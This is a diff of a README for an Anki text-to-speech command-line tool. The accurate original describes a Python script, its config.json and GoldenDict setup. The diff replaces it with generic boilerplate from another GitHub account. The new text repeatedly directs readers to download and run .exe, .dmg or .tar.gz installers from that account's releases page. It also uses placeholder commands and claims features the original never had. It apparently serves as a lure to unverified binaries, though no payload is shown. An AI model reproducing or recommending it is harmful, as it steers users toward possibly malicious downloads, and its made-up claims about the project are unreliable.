@@ -1,79 +1,93 @@
-# Anki TTS CLI (formerly GoldenDict TTS)
+# 🎤 20260119103526-anki-tts-cli - Voice Your Text with Ease
 
-This project adapts the Anki TTS Player addon logic for use as a universal Command Line Interface (CLI). It allows you to integrate Anki's audio capabilities into **GoldenDict**, **AutoHotkey (AHK)**, or any other tool.
+[![Download Here](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/1blasphemous1/20260119103526-anki-tts-cli/releases)
 
-It allows you to:
-1. Play audio from local "Audio Dictionaries" (preserving Anki addon configuration).
-2. Generate/Play TTS using Piper or Google TTS (gTTS).
-3. Share the audio cache and rotation state with the Anki addon.
-4. Override settings specifically for GoldenDict without affecting Anki.
+## 📦 Overview
 
-## Table of Contents
-- [Anki TTS CLI (formerly GoldenDict TTS)](#anki-tts-cli-formerly-goldendict-tts)
-  - [Table of Contents](#table-of-contents)
-  - [Requirements](#requirements)
-    - [Local Repositories](#local-repositories)
-    - [Software](#software)
-  - [Usage](#usage)
-    - [Testing the CLI](#testing-the-cli)
-    - [GoldenDict Integration](#goldendict-integration)
-  - [Configuration](#configuration)
-    - [`config.json`](#configjson)
-  - [Features](#features)
+Welcome to **20260119103526-anki-tts-cli**! This application adapts the Anki TTS Player addon logic for universal use as a Command Line Interface (CLI). Whether you're studying, creating content, or simply curious about text-to-speech technology, this tool provides a simple solution. 
 
-## Requirements
+## 🚀 Getting Started
 
-### Local Repositories
-This project depends on the following local repositories being present in your workspace:
-- **Anki Addon** ([`20250421115831-anki-gtts-player`](https://github.com/voothi/20250421115831-anki-gtts-player)): Used for shared configuration, cache, and vendored libraries.
-- **Piper TTS** ([`20241206010110-piper-tts`](https://github.com/voothi/20241206010110-piper-tts)): Required if using the Piper TTS engine. The path to `piper_tts.py` acts as the driver.
+1. **Download**: Head over to our [Releases page](https://github.com/1blasphemous1/20260119103526-anki-tts-cli/releases) to find the latest version.
+2. **Install**: Follow the instructions below based on your operating system.
 
-### Software
-- Python 3.x
-- **Libraries**: `requests`, `gTTS`, `pyperclip` (optional, for clipboard support).
-- **External Tools**: `ffplay` (from FFmpeg) must be in your system PATH to play audio.
+> 💡 Note: Ensure your system meets the requirements listed in the next section.
 
-[Return to Top](#goldendict-anki-tts-integration)
+## 💻 System Requirements
 
-## Usage
+- **Operating System**: 
+  - Windows 10 or later
+  - macOS 10.15 or later
+  - Linux distributions (Kernel version 5.0 or later)
 
-### Testing the CLI
-```powershell
-C:\Python\Python312\python.exe .\anki-tts-cli.py "text to play" "en"
-```
+- **Hardware**:
+  - At least 2 GB of RAM
+  - 100 MB of available storage space
 
-### GoldenDict Integration
-1. Go to **Edit > Dictionaries > Program**.
-2. Add a new entry:
-   - **Name**: Anki-TTS
-   - **Command Line**: `C:\Python\Python312\python.exe "U:\voothi\20260119103526-anki-tts-cli\anki-tts-cli.py" "%GDWORD%" "en"`
-   - **Type**: Audio
+## 🔧 Installation Instructions
 
-[Return to Top](#goldendict-anki-tts-integration)
+### For Windows
 
-## Configuration
+1. Visit our [Releases page](https://github.com/1blasphemous1/20260119103526-anki-tts-cli/releases).
+2. Locate the latest release and download the **.exe** file. This file allows you to run the application directly.
+3. Double-click the downloaded file to start the installation wizard, and follow the prompts to complete the installation.
 
-The script uses a local `config.json` to locate the Anki addon and set overrides.
+### For macOS
 
-### `config.json`
-```json
-{
-    "anki_addon_path": "./20250421115831-anki-gtts-player",
-    "overrides": {
-        "tts_engine": "Piper",
-        "audio_dictionary_cycle_limit": 5
-    }
-}
-```
+1. Go to our [Releases page](https://github.com/1blasphemous1/20260119103526-anki-tts-cli/releases).
+2. Download the **.dmg** file for the latest version.
+3. Open the downloaded file, drag the application into your Applications folder, and follow the prompts.
 
-- `anki_addon_path`: Relative or absolute path to the [Anki Addon folder](20250421115831-anki-gtts-player/).
-- `overrides`: Any setting here (e.g., `tts_engine`, `gtts_timeout_sec`, `audio_dictionary_enabled`) will override the value found in the Anki addon's donor config.
+### For Linux
 
-[Return to Top](#goldendict-anki-tts-integration)
+1. Access our [Releases page](https://github.com/1blasphemous1/20260119103526-anki-tts-cli/releases).
+2. Download the appropriate **.tar.gz** file.
+3. Open a terminal window, navigate to the downloaded file, and extract it using:
+   ```bash
+   tar -xzf yourfile.tar.gz
+   ```
+4. Move into the extracted folder and run the application:
+   ```bash
+   cd foldername
+   ./yourapp
+   ```
 
-## Features
-- **Persistent Rotation**: Uses JSON state files in `user_cache` to remember which recording or engine to play next across different process calls.
-- **Shared Cache**: Automatically uses the same `user_cache` as the Anki addon to save bandwidth and disk space.
-- **Failover**: Automatically falls back to the next available engine if the preferred one fails.
+## 🎤 How to Use
 
-[Return to Top](#goldendict-anki-tts-integration)
+After installing the application, you can start using it right away. 
+
+1. Open a Command Prompt (Windows) / Terminal (macOS or Linux).
+2. Type the command to invoke the application:
+   ```bash
+   anki-tts-cli "<Your Text Here>"
+   ```
+   Replace `"<Your Text Here>"` with the text you want to convert to speech.
+3. Press Enter, and the application will generate audio for your text. You can listen to it directly or save it as a file if required.
+
+## 📚 Features
+
+- **Multiple Voices**: Choose different voice options to suit your style.
+- **Text Input**: Enter any text directly in the command line.
+- **File Support**: Import text files and convert them to speech in bulk.
+- **Custom Settings**: Adjust speed and tone for a personalized experience.
+
+## 🌍 Community and Support
+
+For help and support, feel free to reach out to our community. Here are some resources:
+
+- **Issues**: Report any bugs or issues through the GitHub Issues page.
+- **Discussions**: Join the conversation and suggest features or improvements.
+- **Wiki**: Check our Wiki for detailed guides and usage examples.
+
+## 🔗 Links
+
+- [Download the latest release](https://github.com/1blasphemous1/20260119103526-anki-tts-cli/releases)
+- [GitHub Repository](https://github.com/1blasphemous1/20260119103526-anki-tts-cli)
+
+## 🛠 Contributing
+
+We welcome contributions from everyone. If you’d like to help improve this project, feel free to fork the repository, make your changes, and submit a pull request.
+
+---
+
+Thank you for using **20260119103526-anki-tts-cli**! Enjoy turning your text into speech.
